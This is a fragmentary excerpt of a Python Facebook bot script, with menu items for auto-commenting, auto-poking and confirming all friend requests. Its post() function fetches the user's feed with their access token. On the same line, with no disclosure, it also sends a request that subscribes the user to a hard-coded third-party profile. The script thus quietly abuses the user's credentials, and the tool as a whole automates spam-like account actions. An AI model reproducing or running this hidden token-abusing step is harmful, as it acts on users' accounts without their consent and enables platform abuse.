...
def menu_bot():
 ...
 ---------   ------------------------------------
   ...
   [ 02 ]      auto comment
   [ 03 ]      auto poke
   [ 04 ]      confirm all friend requests
...
def post():
	...
	try:
	  if WT == 'wallpost':
		...
		r = requests.get('https://graph.facebook.com/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
		result = json.loads(r.text)
